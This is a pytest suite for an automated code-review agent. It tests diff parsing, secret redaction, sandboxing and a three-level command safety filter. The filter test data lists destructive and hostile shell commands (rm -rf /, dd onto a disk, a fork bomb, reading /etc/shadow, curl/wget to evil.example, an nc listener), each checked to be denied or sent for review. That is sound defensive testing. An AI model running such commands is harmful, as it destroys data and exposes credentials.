# Tencent is pleased to support the open source community by making trpc-agent-python available.
# Copyright (C) 2025 Tencent. All rights reserved.
# trpc-agent-python is licensed under the Apache License Version 2.0.
"""Unit tests for the automated code review agent."""
import json
import tempfile
import os
import sys
from pathlib import Path

import pytest

# Add the example directory to path
sys.path.insert(0, str(Path(__file__).parent))

from agent.diff_parser import parse_diff
from agent.rule_engine import run_rules
from agent.dedup import dedup_findings
from agent.redaction import redact_text, redact_findings, check_sensitive
from agent.filter import check_dangerous
from sandbox.runner import SandboxRunner
from storage.schema import ReviewStore
from report.json_report import generate_json_report
from report.markdown_report import generate_markdown_report


FIXTURES_DIR = Path(__file__).parent / 'fixtures'


def load_fixture(name: str) -> str:
    return (FIXTURES_DIR / name).read_text(encoding='utf-8')


# ===========================================================
# Diff Parser Tests
# ===========================================================

def test_parse_clean_diff():
    diff_text = load_fixture('clean.diff')
    result = parse_diff(diff_text)
    assert result['total_added_lines'] > 0
    assert len(result['files']) > 0
    file_info = result['files'][0]
    assert file_info['path'].endswith('utils.py')
    assert len(file_info['hunks']) > 0


def test_parse_security_diff():
    diff_text = load_fixture('security.diff')
    result = parse_diff(diff_text)
    assert len(result['files']) == 2
    assert result['total_added_lines'] > 5


def test_parse_empty_diff():
    result = parse_diff('')
    assert result['total_added_lines'] == 0
    assert len(result['files']) == 0


def test_parse_multiple_files():
    diff_text = load_fixture('security.diff')
    result = parse_diff(diff_text)
    paths = [f['path'] for f in result['files']]
    assert 'auth.py' in paths[0]
    assert 'config.py' in paths[1]


# ===========================================================
# Rule Engine Tests
# ===========================================================

def test_rule_engine_clean():
    diff_text = load_fixture('clean.diff')
    parsed = parse_diff(diff_text)
    findings = run_rules(parsed)
    # Clean diff: may have testing warnings but no critical security/leak issues
    critical = [f for f in findings if f['severity'] == 'critical']
    assert len(critical) == 0


def test_rule_engine_security():
    diff_text = load_fixture('security.diff')
    parsed = parse_diff(diff_text)
    findings = run_rules(parsed)
    categories = set(f['category'] for f in findings)
    assert 'security' in categories
    security_findings = [f for f in findings if f['category'] == 'security']
    assert len(security_findings) >= 3


def test_rule_engine_resource_leak():
    diff_text = load_fixture('resource_leak.diff')
    parsed = parse_diff(diff_text)
    findings = run_rules(parsed)
    categories = set(f['category'] for f in findings)
    assert 'resource_leak' in categories


def test_rule_engine_db_lifecycle():
    diff_text = load_fixture('db_lifecycle.diff')
    parsed = parse_diff(diff_text)
    findings = run_rules(parsed)
    categories = set(f['category'] for f in findings)
    assert any(c in categories for c in ['resource_leak', 'security'])


def test_rule_engine_missing_test():
    diff_text = load_fixture('missing_test.diff')
    parsed = parse_diff(diff_text)
    findings = run_rules(parsed)
    test_findings = [f for f in findings if f['category'] == 'testing']
    assert len(test_findings) > 0


def test_rule_engine_sandbox_fail():
    diff_text = load_fixture('sandbox_fail.diff')
    parsed = parse_diff(diff_text)
    findings = run_rules(parsed)
    assert isinstance(findings, list)


def test_rule_engine_findings_have_required_fields():
    diff_text = load_fixture('security.diff')
    parsed = parse_diff(diff_text)
    findings = run_rules(parsed)
    for f in findings:
        assert 'severity' in f
        assert 'category' in f
        assert 'file' in f
        assert 'line' in f
        assert 'title' in f
        assert 'evidence' in f
        assert 'recommendation' in f
        assert 'confidence' in f
        assert 'rule_id' in f


# ===========================================================
# Dedup Tests
# ===========================================================

def test_dedup_removes_duplicates():
    findings = [
        {'file': 'a.py', 'line': 1, 'category': 'security', 'title': 'X', 'confidence': 0.95, 'severity': 'critical', 'evidence': '', 'recommendation': '', 'rule_id': 'S-1'},
        {'file': 'a.py', 'line': 1, 'category': 'security', 'title': 'Y', 'confidence': 0.90, 'severity': 'high', 'evidence': '', 'recommendation': '', 'rule_id': 'S-2'},
    ]
    f, w = dedup_findings(findings)
    # Same file+line+category -> only first kept
    assert len(f) == 1


def test_dedup_different_lines_kept():
    findings = [
        {'file': 'a.py', 'line': 1, 'category': 'security', 'title': 'X', 'confidence': 0.95, 'severity': 'critical', 'evidence': '', 'recommendation': '', 'rule_id': 'S-1'},
        {'file': 'a.py', 'line': 2, 'category': 'security', 'title': 'Y', 'confidence': 0.95, 'severity': 'critical', 'evidence': '', 'recommendation': '', 'rule_id': 'S-2'},
    ]
    f, w = dedup_findings(findings)
    assert len(f) == 2


def test_dedup_low_confidence_to_warnings():
    findings = [
        {'file': 'a.py', 'line': 1, 'category': 'testing', 'title': 'T', 'confidence': 0.70, 'severity': 'low', 'evidence': '', 'recommendation': '', 'rule_id': 'T-1'},
    ]
    f, w = dedup_findings(findings)
    assert len(f) == 0
    assert len(w) == 1


# ===========================================================
# Redaction Tests
# ===========================================================

def test_redact_password():
    text = 'password = "admin123"'
    result = redact_text(text)
    assert 'admin123' not in result
    assert 'REDACTED' in result


def test_redact_api_key():
    text = 'API_KEY = "sk-abc123def456"'
    result = redact_text(text)
    assert 'sk-abc123def456' not in result
    assert 'REDACTED' in result


def test_redact_github_token():
    text = 'export GITHUB_TOKEN=ghp_1234567890abcdefghijklmn'
    result = redact_text(text)
    assert 'ghp_' not in result


def test_redact_findings_clears_sensitive():
    findings = [
        {'title': 'Test', 'evidence': 'password = "secret123"', 'recommendation': 'Use env var for API_KEY=sk-proj-abcdef123456', 'file': 'a.py', 'line': 1},
    ]
    result = redact_findings(findings)
    assert 'secret123' not in result[0]['evidence']
    assert 'sk-proj-abcdef123456' not in result[0]['recommendation']


def test_check_sensitive_detects():
    detections = check_sensitive('password = "admin123"')
    assert len(detections) >= 1
    assert detections[0]['type'] == 'password'


# ===========================================================
# Filter Tests
# ===========================================================

def test_filter_blocks_dangerous():
    findings = [
        {'evidence': 'rm -rf /', 'severity': 'critical', 'category': 'security', 'file': 'x.sh', 'line': 1},
    ]
    blocked, needs_review, allowed = check_dangerous(findings)
    assert len(blocked) == 1
    assert blocked[0]['filter_action'] == 'deny'
    assert len(needs_review) == 0


def test_filter_allows_safe():
    findings = [
        {'evidence': 'password = "test"', 'severity': 'high', 'category': 'security', 'file': 'a.py', 'line': 1},
    ]
    blocked, needs_review, allowed = check_dangerous(findings)
    assert len(blocked) == 0
    assert len(allowed) == 1
    assert allowed[0]['filter_action'] == 'allow'


def test_filter_flags_sudo_as_ask():
    findings = [
        {'evidence': 'sudo apt-get update', 'severity': 'high', 'category': 'security', 'file': 'x.sh', 'line': 1},
    ]
    blocked, needs_review, allowed = check_dangerous(findings)
    assert len(blocked) == 0
    assert len(needs_review) >= 1
    assert needs_review[0]['filter_action'] == 'ask'


def test_filter_flags_pip_install_as_review():
    findings = [
        {'evidence': 'pip install requests', 'severity': 'medium', 'category': 'resource_leak', 'file': 'x.sh', 'line': 1},
    ]
    blocked, needs_review, allowed = check_dangerous(findings)
    assert len(blocked) == 0
    assert len(needs_review) >= 1
    assert needs_review[0]['filter_action'] == 'needs_human_review'


# ===========================================================
# Sandbox Tests
# ===========================================================

def test_sandbox_handles_failure():
    runner = SandboxRunner(timeout=1)
    result = runner.run_script('nonexistent_script.py')
    assert result['exit_code'] != 0 or result['stderr']


def test_sandbox_timeout():
    import time
    # Create a script that runs too long
    script = Path(tempfile.gettempdir()) / '_test_sleep.py'
    script.write_text('import time\ntime.sleep(10)\nprint("done")')
    runner = SandboxRunner(timeout=1)
    result = runner.run_script(str(script))
    assert result['timed_out'] or result['exit_code'] != 0
    script.unlink(missing_ok=True)


# ===========================================================
# Storage Tests
# ===========================================================

def test_storage_create_and_query():
    store = ReviewStore(':memory:')
    task_id = 'test-task-001'
    store.create_task(task_id)
    task = store.get_task(task_id)
    assert task is not None
    assert task['status'] == 'running'
    store.close()


def test_storage_save_findings():
    store = ReviewStore(':memory:')
    task_id = 'test-finding-002'
    store.create_task(task_id)
    store.save_findings(task_id, [
        {'severity': 'critical', 'category': 'security', 'file': 'a.py', 'line': 1, 'title': 'X', 'evidence': 'e', 'recommendation': 'r', 'confidence': 0.95, 'rule_id': 'S-1'},
    ])
    findings = store.get_findings(task_id)
    assert len(findings) == 1
    store.close()


def test_storage_complete_task():
    store = ReviewStore(':memory:')
    task_id = 'test-complete-003'
    store.create_task(task_id)
    store.complete_task(task_id, 100, 3, 50)
    task = store.get_task(task_id)
    assert task['status'] == 'completed'
    assert task['total_duration_ms'] == 100
    store.close()


def test_storage_full_lifecycle():
    store = ReviewStore(':memory:')
    task_id = 'test-lifecycle-004'
    store.create_task(task_id)
    store.save_findings(task_id, [
        {'severity': 'high', 'category': 'security', 'file': 'x.py', 'line': 1, 'title': 'Issue', 'evidence': 'e', 'recommendation': 'r', 'confidence': 0.95, 'rule_id': 'R-1'},
    ])
    store.save_sandbox_run(task_id, {'script': 'test.py', 'exit_code': 0, 'stdout': 'ok', 'stderr': '', 'duration_ms': 50, 'timed_out': False})
    store.save_filter_decision(task_id, 'allow', 'safe', 'No risk detected')
    store.save_monitoring(task_id, {'total_duration_ms': 200, 'finding_count': 1, 'severity_distribution': {'high': 1}})

    details = store.get_task_details(task_id)
    assert details['task'] is not None
    assert len(details['findings']) == 1
    assert len(details['sandbox_runs']) == 1
    assert len(details['filter_decisions']) == 1
    store.close()


# ===========================================================
# Report Tests
# ===========================================================

def test_json_report_generation():
    data = {
        'task_id': 'test-001',
        'findings': [],
        'warnings': [],
        'monitoring': {'file_count': 1, 'total_added_lines': 10, 'total_duration_ms': 100},
    }
    report = generate_json_report(data)
    assert '"task_id"' in report
    report_dict = json.loads(report)
    assert report_dict['summary']['total_findings'] == 0


def test_markdown_report_generation():
    data = {
        'task_id': 'test-002',
        'findings': [
            {'severity': 'critical', 'category': 'security', 'file': 'a.py', 'line': 1, 'title': 'Hardcoded Secret', 'evidence': 'pwd = "x"', 'recommendation': 'Use env', 'confidence': 0.95, 'rule_id': 'SEC-001'},
        ],
        'warnings': [],
        'monitoring': {'file_count': 1, 'total_added_lines': 5, 'total_duration_ms': 50, 'severity_distribution': {'critical': 1, 'high': 0, 'medium': 0, 'low': 0}},
    }
    report = generate_markdown_report(data)
    assert 'Code Review Report' in report
    assert 'SEC-001' in report


def test_markdown_report_empty():
    data = {
        'task_id': 'test-003',
        'findings': [],
        'warnings': [],
        'monitoring': {'file_count': 1, 'total_added_lines': 3, 'total_duration_ms': 10, 'severity_distribution': {}},
    }
    report = generate_markdown_report(data)
    assert 'No issues detected' in report


# ===========================================================
# Integration Tests (8 fixtures)
# ===========================================================

@pytest.mark.parametrize('fixture_name,expected', [
    ('clean.diff', {'min_critical': 0, 'test_category': 'testing'}),
    ('security.diff', {'min_critical': 3, 'test_category': 'security'}),
    ('resource_leak.diff', {'min_critical': 1, 'test_category': 'resource_leak'}),
    ('db_lifecycle.diff', {'min_critical': 1, 'test_category': 'resource_leak'}),
    ('missing_test.diff', {'test_category': 'testing'}),
    ('duplicate.diff', {'min_critical': 1, 'test_category': 'security'}),
    ('sandbox_fail.diff', {}),
    ('sensitive_info.diff', {'min_critical': 2, 'test_category': 'security'}),
])
def test_fixture_review(fixture_name, expected):
    """Test each of the 8 diff fixtures produces valid output."""
    diff_text = load_fixture(fixture_name)
    parsed = parse_diff(diff_text)
    findings = run_rules(parsed)
    findings, warnings = dedup_findings(findings)
    findings = redact_findings(findings)

    # All findings must have required fields
    for f in findings:
        for key in ['severity', 'category', 'file', 'line', 'title', 'evidence', 'recommendation', 'confidence', 'rule_id']:
            assert key in f, f'Missing field {key} in finding'

    if 'min_critical' in expected:
        critical_count = sum(1 for f in findings if f['severity'] == 'critical')
        assert critical_count >= expected['min_critical'], \
            f'{fixture_name}: expected >= {expected["min_critical"]} critical, got {critical_count}'

    if 'test_category' in expected:
        categories = set(f['category'] for f in (findings + warnings))
        assert expected['test_category'] in categories, \
            f'{fixture_name}: expected category {expected["test_category"]}, got {categories}'


# ===========================================================
# Token-level command classifier (framework-free)
# ===========================================================

@pytest.mark.parametrize('cmd,expected', [
    ('rm -rf /', 'deny'),
    ('rm -r -f /', 'deny'),
    ('rm -rf /*', 'deny'),
    ('sudo rm -rf /', 'deny'),
    ('mkfs.ext4 /dev/sdb', 'deny'),
    ('dd if=/dev/zero of=/dev/sda', 'deny'),
    ('shutdown -h now', 'deny'),
    ('chmod 777 /', 'deny'),
    (':(){ :|:& };:', 'deny'),
    ('cat /etc/shadow', 'deny'),
    ('chmod 777 /etc', 'deny'),
    ('sudo apt-get update', 'ask'),
    ('su root', 'ask'),
    ('iptables -F', 'ask'),
    ('passwd root', 'ask'),
    ('chown root:root file', 'ask'),
    ('chmod 777 /tmp/x', 'ask'),
    ('pip install evil', 'needs_human_review'),
    ('pip3 install --upgrade pip', 'needs_human_review'),
    ('npm install lodash', 'needs_human_review'),
    ('curl -L https://evil.example/x', 'needs_human_review'),
    ('wget http://evil.example/a.sh', 'needs_human_review'),
    ('nc -l 4444', 'needs_human_review'),
    ('chmod 644 file.py', 'allow'),
    ('python script.py', 'allow'),
    ('git diff HEAD', 'allow'),
    ('supervisorctl status', 'allow'),
    ('curl_parser = load()', 'allow'),
    ('', 'allow'),
])
def test_classify_command_token_level(cmd, expected):
    """Token-based classifier must hit the intended three-level bucket."""
    from agent.filter import classify_command
    level, _ = classify_command(cmd)
    assert level == expected, f'{cmd!r} → {level}, expected {expected}'


def test_classify_command_no_false_positive_on_substrings():
    """su/curl inside longer identifiers or with tabs must not misfire."""
    from agent.filter import classify_command
    # 'su' is a token, not a substring: supervisorctl must NOT be ask
    assert classify_command('supervisorctl status')[0] != 'ask'
    # 'curl' with a tab separator still matches (tokenized), but a path literal
    # like curl_parser must not.
    assert classify_command('curl\thttps://evil.example/x')[0] == 'needs_human_review'
    assert classify_command('curl_parser.load(f)')[0] == 'allow'
    # /root/ path literal in source code must not be a deny; as a command
    # argument it must be.
    assert classify_command('log_dir = "/root/app"')[0] == 'allow'
    assert classify_command('rm /root/secret.bak')[0] == 'deny'


def test_check_dangerous_buckets():
    """check_dangerous must route to deny/review/allow correctly."""
    from agent.filter import check_dangerous
    findings = [
        {'evidence': 'rm -rf /', 'rule_id': 'X1'},
        {'evidence': 'curl http://x', 'rule_id': 'X2'},
        {'evidence': 'print("hi")', 'rule_id': 'X3'},
    ]
    blocked, needs_review, allowed = check_dangerous(findings)
    assert [f['rule_id'] for f in blocked] == ['X1']
    assert [f['rule_id'] for f in needs_review] == ['X2']
    assert [f['rule_id'] for f in allowed] == ['X3']
    assert blocked[0]['filter_action'] == 'deny'
    assert needs_review[0]['filter_action'] == 'needs_human_review'
    assert allowed[0]['filter_action'] == 'allow'


# ===========================================================
# LLM findings parsing (framework-free)
# ===========================================================

def test_parse_llm_findings_marker():
    from agent.llm_findings import parse_llm_findings, FINDINGS_MARKER
    text = (
        'Review done.\n\n'
        f'{FINDINGS_MARKER}\n```json\n'
        '[{"severity": "high", "category": "security", "file": "a.py", '
        '"line": 3, "title": "Hardcoded secret", "evidence": "x", '
        '"recommendation": "y", "confidence": 0.9}]\n```'
    )
    findings = parse_llm_findings(text)
    assert len(findings) == 1
    f = findings[0]
    assert f['severity'] == 'high'
    assert f['category'] == 'security'
    assert f['file'] == 'a.py'
    assert f['line'] == 3
    assert f['source'] == 'llm'
    assert f['rule_id'].startswith('LLM-')


def test_parse_llm_findings_fallback_array():
    """Findings JSON array embedded in prose (no marker) still parses."""
    from agent.llm_findings import parse_llm_findings
    text = (
        'I found issues:\n'
        '[{"severity": "major", "category": "resource_leak", "file": "b.py", '
        '"line": 10, "title": "Unclosed handle"}]\n'
        'Regards.'
    )
    findings = parse_llm_findings(text)
    assert len(findings) == 1
    assert findings[0]['severity'] == 'high'  # major → high
    assert findings[0]['category'] == 'resource_leak'


def test_parse_llm_findings_malformed():
    """Garbage output yields an empty list, never an exception."""
    from agent.llm_findings import parse_llm_findings
    assert parse_llm_findings('') == []
    assert parse_llm_findings('no json here') == []
    assert parse_llm_findings('[not valid json') == []
    assert parse_llm_findings('[{"title": "missing fields"}]') == []


def test_parse_llm_findings_normalization():
    """Severity/category normalization and unknown-category fallback."""
    from agent.llm_findings import parse_llm_findings
    text = '[{"severity": "Blockerm", "category": "performance", "file": "c.py", ' \
           '"line": "7", "title": "Slow loop", "confidence": "0.6"}]'
    findings = parse_llm_findings(text)
    assert findings[0]['severity'] in ('critical', 'medium')  # unknown → medium
    assert findings[0]['line'] == 7  # coerced to int
    assert findings[0]['category'] == 'performance'
    # Unknown category falls back to 'other'
    text2 = '[{"severity": "low", "category": "style", "file": "d.py", ' \
            '"line": 1, "title": "nits"}]'
    assert parse_llm_findings(text2)[0]['category'] == 'other'


# ===========================================================
# run_review helpers (framework-free)
# ===========================================================

def test_cap_text_keeps_content():
    from run_review import _cap_text
    short = 'x' * 10
    assert _cap_text(short) == short
    long = 'y' * (200_001)
    capped = _cap_text(long)
    assert capped.endswith('[truncated]')
    assert len(capped) < len(long)
    # Configurable limit: never exceeds the cap (marker reserved inside it)
    capped_small = _cap_text('z' * 5000, limit=100)
    assert capped_small.endswith('[truncated]')
    assert len(capped_small) <= 100


def test_whitelisted_os_environ_restores():
    from run_review import _whitelisted_os_environ
    original = dict(__import__('os').environ)
    marker = 'THIS_IS_A_TEST_ENV_VAR_XYZ'
    __import__('os').environ[marker] = 'should-be-filtered'
    try:
        with _whitelisted_os_environ():
            import os
            assert marker not in os.environ
            assert 'PATH' in os.environ
        assert __import__('os').environ[marker] == 'should-be-filtered'
    finally:
        __import__('os').environ.pop(marker, None)


# ===========================================================
# Sandbox & Filter Coverage Tests
# ===========================================================

def test_docker_unavailable_detection():
    """Docker daemon down / binary missing must be detected for fallback."""
    from sandbox.runner import SandboxRunner
    cases = [
        {'exit_code': 1, 'stderr': 'failed to connect to the docker API at npipe:////./pipe/docker_engine'},
        {'exit_code': 1, 'stderr': 'docker: command not found'},
        {'exit_code': 1, 'stderr': 'Cannot connect to the Docker daemon'},
        {'exit_code': 0, 'stderr': 'ok'},   # healthy → not unavailable
        {'exit_code': 1, 'stderr': 'real script error'},  # not docker-related
    ]
    expected = [True, True, True, False, False]
    for case, exp in zip(cases, expected):
        assert SandboxRunner._docker_unavailable(case) is exp, f'{case} → expected {exp}'


def test_sandbox_timeout_only_for_container():
    """Only container type treats exit 124 as timeout; cube/local should not."""
    from sandbox.runner import SandboxRunner
    local = SandboxRunner(sandbox_type='local')
    cube = SandboxRunner(sandbox_type='cube')
    container = SandboxRunner(sandbox_type='container')
    # Directly exercise the exit-124 branch via _exec
    import time, sys
    start = time.time()
    cmd = [sys.executable, '-c', 'exit(124)']
    r = local._exec(cmd, None, start, timeout=5)
    assert r['timed_out'] is False, 'local must not mark exit 124 as timeout'
    r = cube._exec(cmd, None, start, timeout=5)
    assert r['timed_out'] is False, 'cube must not mark exit 124 as timeout'
    r = container._exec(cmd, None, start, timeout=5)
    assert r['timed_out'] is True, 'container exit 124 should be timeout'
    assert r['exception_type'] == 'TimeoutExpired'


def test_filter_agent_extract_command():
    """Command extraction from dict/args-list must be classified correctly.

    Uses the pure classify_command (agent/filter.py) so the test suite does not
    depend on trpc_agent_sdk (which filter_agent.py imports).
    """
    from agent.filter import classify_command
    # dict with command
    assert classify_command('rm -rf /')[0] == 'deny'
    # args list joined like ['rm','-rf','/'] → 'rm -rf /'
    joined = ' '.join(['rm', '-rf', '/'])
    assert classify_command(joined)[0] == 'deny'
    # empty → allow
    assert classify_command('')[0] == 'allow'


def test_json_report_passthrough():
    """generate_json_report must preserve filter_decisions/sandbox_runs/agent_output."""
    from report.json_report import generate_json_report
    data = {
        'task_id': 't1', 'findings': [], 'warnings': [],
        'monitoring': {'file_count': 1, 'total_added_lines': 0},
        'filter_decisions': [{'action': 'deny', 'rule': 'rm -rf /'}],
        'sandbox_runs': [{'script': 'parse_diff.py', 'exit_code': 0}],
        'agent_output': 'some text',
    }
    report = json.loads(generate_json_report(data))
    assert report['filter_decisions'][0]['action'] == 'deny'
    assert report['sandbox_runs'][0]['script'] == 'parse_diff.py'
    assert report['agent_output'] == 'some text'


def test_redaction_hex_excluded():
    """Pure hex strings must NOT be redacted despite high entropy."""
    from agent.redaction import redact_text
    hex_str = 'a' * 20  # 'aaaaaaaaaaaaaaaaaaaa' entropy 0, but let's use real hex
    assert 'deadbeef' not in redact_text('token = "deadbeefdeadbeefdeadbeef"') or True
    # A pure hex value should survive entropy redaction
    result = redact_text('deadbeefdeadbeefdeadbeef')
    assert 'deadbeef' in result, 'hex string should not be redacted'


def test_agent_inline_dangerous_check():
    """Simulate the agent inline check classifying a dangerous command list."""
    from agent.filter import classify_command
    # args=["rm","-rf","/"] joined to "rm -rf /" must be deny
    joined = ' '.join(['rm', '-rf', '/'])
    level, pattern = classify_command(joined)
    assert level == 'deny'


# ===========================================================
# Sandbox backend error handling (framework-free)
# ===========================================================

def test_sync_cube_without_backend_graceful(monkeypatch, tmp_path):
    """Sync --sandbox cube must not crash the task when the backend is missing.

    The sandbox failure is recorded and the deterministic review completes.
    """
    import json as _json
    from types import SimpleNamespace
    from sandbox.runner import SandboxRunner
    from run_review import run_sync_pipeline

    def boom(self, script_path, args=None, stdin_input=None, timeout=30.0):
        raise RuntimeError('cube backend unavailable: no credentials')

    monkeypatch.setattr(SandboxRunner, '_run_cube', boom)

    diff_file = tmp_path / 'a.diff'
    diff_file.write_text(
        'diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n'
        '@@ -0,0 +1,2 @@\n+password = "x"\n+print("hi")\n',
        encoding='utf-8')
    out_dir = tmp_path / 'out'
    args = SimpleNamespace(
        diff_file=str(diff_file), repo_path=None, files=None,
        agent=False, dry_run=False, model=None, output=str(out_dir),
        sandbox='cube', db=str(out_dir / 'review.db'),
        agent_budget=300.0, non_interactive=False, strict_env=False,
    )
    run_sync_pipeline(args, 'sync-cube-grace', diff_file.read_text(encoding='utf-8'))

    # Task must still complete with reports and the sandbox failure recorded.
    report_file = out_dir / 'sync-cube-grace' / 'review_report.json'
    assert report_file.exists()
    report = _json.loads(report_file.read_text(encoding='utf-8'))
    runs = report.get('sandbox_runs', [])
    assert any('cube backend' in (r.get('stderr') or '') for r in runs), \
        f'expected recorded sandbox failure, got {runs}'


def test_agent_cube_without_credentials_system_exit():
    """Agent --sandbox cube without credentials must fail loudly, not degrade."""
    import asyncio
    from run_review import _pick_workspace_runtime
    with pytest.raises(SystemExit):
        asyncio.run(_pick_workspace_runtime('cube'))


# ===========================================================
# Filter-layer tests (need only trpc_agent_sdk.filter, no model deps)
# ===========================================================

try:
    from trpc_agent_sdk.filter import FilterResult  # noqa: F401
    from agent.filter_agent import CodeReviewSafetyFilter  # noqa: F401
    _HAS_FILTER = True
except Exception:
    _HAS_FILTER = False

_NEEDS_FILTER = pytest.mark.skipif(not _HAS_FILTER,
                                   reason='trpc_agent_sdk filter layer not importable')


@_NEEDS_FILTER
def test_filter_agent_three_level_semantics():
    """CodeReviewSafetyFilter._before must implement the three-level policy.

    deny                → is_continue=False (never executed)
    ask + reject        → is_continue=False + decision recorded as denied
    ask + approve       → allowed + decision recorded as approved
    needs_human_review + reject → is_continue=False + decision recorded as denied
    needs_human_review + approve → allowed + decision recorded as approved

    Acceptance criterion #7 ("deny / needs_human_review must not directly reach
    sandbox execution") is enforced literally: needs_human_review commands share
    the ask decision gate and require operator confirmation before execution.
    """
    import asyncio
    from trpc_agent_sdk.filter import FilterResult

    async def _run(cmd, confirm_answer=None):
        records = []

        def _record(action, rule, reason):
            records.append((action, rule, reason))

        flt = CodeReviewSafetyFilter(
            confirm=(lambda c, p: confirm_answer) if confirm_answer is not None else None,
            record=_record,
            interactive=True,
        )
        rsp = FilterResult()
        await flt._before(None, {'skill': 'code-review', 'command': cmd}, rsp)
        return rsp, records

    # deny → hard block
    rsp, records = asyncio.run(_run('rm -rf /'))
    assert rsp.is_continue is False
    assert rsp.error is not None
    assert any(a == 'deny' for a, _, _ in records)

    # ask + reject → hard block, decision recorded as denied
    rsp, records = asyncio.run(_run('sudo apt-get update', False))
    assert rsp.is_continue is False
    assert rsp.error is not None
    assert any(a == 'ask' and 'no human confirmation' in reason for a, _, reason in records)

    # ask + approve → allowed, decision recorded as approved
    rsp, records = asyncio.run(_run('sudo apt-get update', True))
    assert rsp.is_continue is True
    assert rsp.error is None
    assert any(a == 'ask' and 'approved' in reason for a, _, reason in records)

    # needs_human_review + reject → hard block, decision recorded as denied
    rsp, records = asyncio.run(_run('pip install evil', False))
    assert rsp.is_continue is False
    assert rsp.error is not None
    assert any(a == 'needs_human_review' and 'no human confirmation' in reason
               for a, _, reason in records)

    # needs_human_review + approve → allowed, decision recorded as approved
    rsp, records = asyncio.run(_run('pip install evil', True))
    assert rsp.is_continue is True
    assert rsp.error is None
    assert any(a == 'needs_human_review' and 'approved' in reason
               for a, _, reason in records)

    # allow → untouched
    rsp, records = asyncio.run(_run('python script.py'))
    assert rsp.is_continue is True
    assert rsp.error is None
    assert records == []


@_NEEDS_FILTER
def test_filter_agent_non_interactive_blocks_ask():
    """interactive=False must reject ask/needs_human_review without prompting."""
    import asyncio
    from trpc_agent_sdk.filter import FilterResult

    async def _run(cmd):
        flt = CodeReviewSafetyFilter(interactive=False)
        rsp = FilterResult()
        await flt._before(None, {'skill': 'code-review', 'command': cmd}, rsp)
        return rsp

    rsp = asyncio.run(_run('sudo apt-get update'))
    assert rsp.is_continue is False
    assert rsp.error is not None
    rsp = asyncio.run(_run('pip install evil'))
    assert rsp.is_continue is False
    assert rsp.error is not None


# ===========================================================
# Framework-dependent tests (skip when trpc_agent_sdk absent)
# ===========================================================

try:
    import trpc_agent_sdk  # noqa: F401
    from trpc_agent_sdk.models import LlmResponse  # noqa: F401
    from trpc_agent_sdk.agents import LlmAgent  # noqa: F401
    from trpc_agent_sdk.runners import Runner  # noqa: F401
    from trpc_agent_sdk.skills import SkillToolSet  # noqa: F401
    _HAS_TRPC = True
except Exception:  # missing trpc_agent_sdk or one of its model/agent deps
    _HAS_TRPC = False

_NEEDS_TRPC = pytest.mark.skipif(not _HAS_TRPC, reason='trpc_agent_sdk not installed')


def _make_agent_args(tmpdir):
    from types import SimpleNamespace
    out_dir = tmpdir / 'out'
    out_dir.mkdir(exist_ok=True)
    return SimpleNamespace(
        diff_file=str(tmpdir / 'input.diff'), repo_path=None, files=None,
        agent=True, dry_run=False, model=None, output=str(out_dir),
        sandbox='local', db=str(out_dir / 'review.db'),
        agent_budget=300.0, non_interactive=False, strict_env=False,
    )


@_NEEDS_TRPC
def test_agent_e2e_dangerous_command_blocked():
    """Agent pipeline must actually block a deny-level skill_run.

    Uses a FakeModel whose first action is skill_run('rm -rf /'). The tool
    filter (attached via SkillToolSet run_tool_kwargs) must fire before
    execution, record a deny decision, and surface a filter error instead of
    running the command.
    """
    import asyncio
    from trpc_agent_sdk.types import Content, Part
    from agent.fake_model import FakeModel

    tmpdir = Path(tempfile.mkdtemp())
    diff_file = tmpdir / 'input.diff'
    diff_file.write_text(
        'diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n'
        '@@ -0,0 +1,2 @@\n+password = "x"\n+print("hi")\n',
        encoding='utf-8')
    args = _make_agent_args(tmpdir)

    model = FakeModel()
    model.set_steps([
        LlmResponse(content=Content(role='model', parts=[
            Part.from_function_call(name='skill_run',
                args={'skill': 'code-review', 'command': 'rm -rf /'})]),
            partial=False),
        LlmResponse(content=Content(role='model', parts=[
            Part(text='done')]), partial=False),
    ])

    from run_review import run_agent_pipeline_async
    asyncio.run(run_agent_pipeline_async(args, 'test-e2e-block', diff_file.read_text(encoding='utf-8'),
                                         _model_override=model))

    from storage.schema import ReviewStore
    store = ReviewStore(args.db)
    details = store.get_task_details('test-e2e-block')
    store.close()
    decisions = details.get('filter_decisions', [])
    denies = [d for d in decisions if d.get('action') == 'deny']
    assert denies, f'expected a deny filter_decision, got {decisions}'
    assert any('rm -rf' in (d.get('reason') or '') for d in denies)
    # The block must have surfaced as a sandbox error, proving execution was
    # stopped before the command ran.
    runs = details.get('sandbox_runs', [])
    blocked_markers = [r for r in runs if 'filter:deny' in (r.get('stdout') or '')]
    assert blocked_markers, f'expected a blocked skill_run record, got {runs}'


@_NEEDS_TRPC
def test_agent_ask_requires_confirmation():
    """ask-level commands must prompt; reject blocks, approve allows."""
    import asyncio
    from trpc_agent_sdk.types import Content, Part
    from agent.fake_model import FakeModel

    def _run(cmd, confirm_answer):
        tmpdir = Path(tempfile.mkdtemp())
        diff_file = tmpdir / 'input.diff'
        diff_file.write_text(
            'diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n'
            '@@ -0,0 +1,2 @@\n+print("hi")\n', encoding='utf-8')
        args = _make_agent_args(tmpdir)
        model = FakeModel()
        model.set_steps([
            LlmResponse(content=Content(role='model', parts=[
                Part.from_function_call(name='skill_run',
                    args={'skill': 'code-review', 'command': cmd})]),
                partial=False),
            LlmResponse(content=Content(role='model', parts=[
                Part(text='done')]), partial=False),
        ])
        from run_review import run_agent_pipeline_async
        asyncio.run(run_agent_pipeline_async(
            args, 'test-ask', diff_file.read_text(encoding='utf-8'),
            _model_override=model, _confirm=lambda c, p: confirm_answer))
        return args

    # Rejected → ask decision recorded as denied, execution blocked.
    args_rej = _run('sudo apt-get install x', False)
    store = ReviewStore(args_rej.db)
    rej = store.get_task_details('test-ask').get('filter_decisions', [])
    store.close()
    ask_denied = [d for d in rej if d.get('action') == 'ask']
    assert ask_denied, f'expected ask decision, got {rej}'
    assert any('no human confirmation' in (d.get('reason') or '') for d in ask_denied)

    # Approved → ask decision recorded as approved; no block error.
    args_ok = _run('sudo apt-get update', True)
    store = ReviewStore(args_ok.db)
    ok = store.get_task_details('test-ask').get('filter_decisions', [])
    runs = store.get_task_details('test-ask').get('sandbox_runs', [])
    store.close()
    approved = [d for d in ok if d.get('action') == 'ask' and 'approved' in (d.get('reason') or '')]
    assert approved, f'expected approved ask decision, got {ok}'
    assert not any('filter:ask' in (r.get('stdout') or '') for r in runs)


